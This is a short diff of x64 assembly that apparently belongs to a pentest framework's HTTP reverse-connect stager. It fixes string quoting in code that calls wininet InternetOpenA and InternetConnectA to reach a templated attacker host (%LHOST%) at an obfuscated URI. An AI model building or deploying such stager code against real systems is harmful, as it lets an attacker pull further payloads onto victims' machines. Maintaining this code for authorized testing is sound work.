@@ -123,7 +123,7 @@ save_beginning:
     push rbx
     push rbx
     call to_rename_17c
-    db "%USER-AGENT%\0"
+    db `%USER-AGENT%\0`
 
 to_rename_17c:
     pop rcx
@@ -136,7 +136,7 @@ to_rename_17c:
     mov r10,%HASH__wininet.dll__InternetOpenA% ; wininet.InternetOpenA()
     call rbp
     call to_rename_1a5
-    db "%LHOST%\0"
+    db `%LHOST%\0`
 
 to_rename_1a5:
     pop rdx
@@ -150,7 +150,7 @@ to_rename_1a5:
     mov r10,%HASH__wininet.dll__InternetConnectA% ; wininet.InternetConnectA()
     call rbp
     call to_rename_29f
-    db "/BOrVVpMcxVd5BHgGHrp5Ugqy9lv_X8u7KkEtP-vi-hjOv_HN9WvuZ3ryuy8IcOiPcblYiDEmz4WCDoX1wp6Cb7M7Z6cv1XT0aToXDcSFOS9DFhDuWRltirbshEL1QtSDY1yFdu-m4Y8Trgn6oIjV8KoSLw9aBThG0VcrrphUfBXTqUyzDwFO0y-1JsWYnrgPve45LMKr4y9xvxzotKwi\0"
+    db `/BOrVVpMcxVd5BHgGHrp5Ugqy9lv_X8u7KkEtP-vi-hjOv_HN9WvuZ3ryuy8IcOiPcblYiDEmz4WCDoX1wp6Cb7M7Z6cv1XT0aToXDcSFOS9DFhDuWRltirbshEL1QtSDY1yFdu-m4Y8Trgn6oIjV8KoSLw9aBThG0VcrrphUfBXTqUyzDwFO0y-1JsWYnrgPve45LMKr4y9xvxzotKwi\0`
 
 to_rename_29f:
     mov rcx,rax
